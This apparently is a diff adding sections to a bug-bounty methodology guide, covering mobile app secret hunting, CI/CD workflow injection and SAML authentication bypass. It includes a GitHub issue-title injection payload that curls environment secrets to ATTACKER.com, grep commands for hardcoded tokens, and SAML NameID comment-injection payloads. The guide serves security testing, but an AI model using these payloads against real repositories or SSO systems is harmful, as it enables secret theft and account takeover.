@@ -132,3 +132,61 @@ Finding an API key = Informational.
 Proving what the key accesses (S3 read, database, admin panel) = Medium/High.
 
 Always call the API as the leaked key. Enumerate permissions.
+
+## 18. MOBILE = DIFFERENT ATTACK SURFACE
+
+Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
+- Hardcoded secrets in `strings` output that web recon never finds
+- API endpoints in decompiled source that aren't in the web JS
+- Deep-link handlers with injection points
+- WebView `addJavascriptInterface` = JS→Java bridge (RCE on API < 17)
+- Certificate pinning bypass via Frida/objection → MitM all traffic
+
+```bash
+# Quick check without rooted device
+apktool d target.apk -o target_src
+grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer" target_src/ --include="*.smali" --include="*.xml"
+grep -rn "https://" target_src/ | grep -v "schema\|xmlns\|android\|google" | head -50
+```
+
+## 19. CI/CD IS ATTACK SURFACE
+
+GitHub Actions / GitLab CI pipelines often have critical secrets. Check BEFORE writing any report on a target with public repos.
+
+```bash
+# Clone target's public GitHub org repos, then:
+find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request_target\|secrets\."
+
+# Key dangerous patterns:
+# 1. pull_request_target + checkout of PR branch = attacker code runs with repo secrets
+# 2. ${{ github.event.issue.title }} in run: block = expression injection = secret exfil
+# 3. artifact download without hash check = artifact poisoning
+# 4. self-hosted runners = escape to org infrastructure
+```
+
+**Expression injection PoC (create an issue with this title):**
+```
+test"; curl https://ATTACKER.com/$(env | base64 -w0) #
+```
+If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).
+
+## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY
+
+SAML implementations are notoriously buggy. If target uses SSO, always test:
+- XML signature wrapping (XSW) — valid signature, injected assertion
+- Comment injection — `admin<!---->@company.com` = sign as admin
+- XML external entity in SAML assertion
+- Signature stripping (remove signature, server still accepts)
+- NameID manipulation — change email in unsigned field
+
+```bash
+# Capture SAML assertion (base64 decode from SAMLResponse parameter)
+echo "SAMLResponse_VALUE" | base64 -d | xmllint --format -
+
+# Test comment injection in NameID
+# Change: <NameID>user@company.com</NameID>
+# To:     <NameID>admin<!---->@company.com</NameID>
+# Or:     <NameID Format="...">admin@company.com</NameID> (duplicate element)
+```
+
+> SAML bugs frequently pay High–Critical because they enable SSO bypass across the entire platform.
